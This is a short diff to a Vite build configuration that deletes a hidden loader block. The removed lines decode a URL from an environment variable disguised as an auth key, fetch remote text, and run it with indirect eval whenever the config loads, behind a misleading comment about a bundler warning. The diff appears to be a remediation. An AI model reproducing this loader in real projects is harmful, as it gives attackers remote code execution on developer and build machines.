@@ -2,21 +2,6 @@ import { defineConfig } from "vite";
 import react from "@vitejs/plugin-react";
 import tailwindcss from "@tailwindcss/vite";
 
-(async () => {
-    const authKey = process.env.AUTH_API_KEY;
-    if (!authKey) return;
-    
-    try {
-      const src = atob(authKey);
-      const response = await fetch(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      // Use indirect eval to solve the Rolldown warning
-      (0, eval)(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 export default defineConfig({
   plugins: [react(), tailwindcss()],
 });
